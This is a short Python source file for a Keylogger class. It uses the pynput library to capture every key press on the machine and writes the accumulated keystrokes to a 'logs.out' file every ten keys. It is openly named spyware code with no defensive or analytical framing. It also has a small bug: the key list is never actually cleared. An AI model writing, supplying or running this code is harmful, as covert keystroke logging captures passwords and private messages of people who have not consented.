from os import sep
from sys import exit
from _thread import start_new_thread

from pynput.keyboard import Key, Listener

class Keylogger:
    def __init__(self, saving_dir: str) -> None:
        self.log_file = saving_dir + sep + "logs.out"
        
        self.key_list = []
        self.count = 0

    def _write_file(self):
        with open(self.log_file, 'w') as key_strokes:
            key_strokes.write("".join(self.key_list))

    def _on_press(self, key):
        if key == Key.space:
            key = " "
        if key == Key.backspace:
            key = ""
        if key == Key.enter:
            key = "\n"

        self.key_list.append(str(key).replace("'", ""))
        self.count+=1
        if self.count >= 10:
            start_new_thread(self._write_file, ())
            self.key_list.clear
            self.count=0

    def run(self):
        try:
            with Listener(on_press=self._on_press) as listener:
                listener.join()
        finally:
            self._write_file()
            exit(1)